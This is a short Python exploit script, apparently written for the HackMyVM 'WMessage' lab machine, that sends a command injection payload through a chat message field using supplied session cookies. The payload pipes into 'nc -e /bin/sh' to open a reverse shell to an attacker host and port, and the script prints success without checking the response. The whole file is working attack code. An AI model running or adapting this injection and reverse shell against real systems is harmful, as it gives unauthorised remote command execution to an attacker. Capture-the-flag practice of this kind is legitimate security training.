import requests
import argparse

parser = argparse.ArgumentParser(description='HackMyVM WMessageExploit Command Injection')

parser.add_argument('-r', help='remember_token ', required=True)
parser.add_argument('-u', help='URL', required=True)
parser.add_argument('-s', help='session', required=True)
parser.add_argument('-P', help='PORT', required=True)
parser.add_argument('-a', help='ATTACKER_HOST', required=True)
args = parser.parse_args()

url = args.u
# cookies
remember_token = args.r
session_num = args.s
ATTACKER_HOST = args.a
port = args.P
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase

	
payload = f"msg=%21mpstat%7C+nc+-e+%2Fbin%2Fsh++{ATTACKER_HOST}+{port}"
#payload = f"!mpstat| ping -c 3 10.10.10.1"

headers = {
    'Host': '10.10.10.7',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': f'{url}/',
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'Origin': f'{url}',
    'Content-Length': '51',
    'Cookie': 'remember_token=' f'{remember_token };' 'session=' f'{session_num}/',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

requests.post(url, data=payload, headers=headers)
print('[+] Exploit completed successfully!')
